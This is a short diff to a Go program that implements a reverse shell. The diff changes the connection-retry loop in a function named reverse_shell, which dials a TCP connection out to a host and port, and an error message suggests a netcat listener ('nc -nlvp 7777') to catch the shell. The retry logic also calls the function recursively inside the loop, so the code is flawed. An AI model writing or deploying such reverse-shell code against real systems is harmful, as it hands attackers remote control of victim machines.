@@ -26,14 +26,16 @@ func reverse_shell(host string, port string) {
 	fmt.Println(full_conn)
 
 	conn, err := net.Dial("tcp", full_conn) // TCP call on IP:PORT
-	if err != nil {                         // Errors verification
+	var i int = 0
+	if err != nil { // Errors verification
 		if nil != conn {
 			conn.Close() // Close connexion in case of error
 		}
-		for i := 1; i <= 5; i++ { // For loop to retry connexion for 5 times before exiting
+		for i < 5 { // For loop to retry connexion for 5 times before exiting
 			fmt.Fprintf(stderr, "Host connexion impossible\nTo try in local, you can : nc -nlvp 7777\n")
-			time.Sleep(5 * time.Second)
+			time.Sleep(2 * time.Second)
 			reverse_shell(host, port)
+			i++
 		}
 		fmt.Fprintf(stderr, "EXITING - 5 failed connexions\n")
 		os.Exit(1)
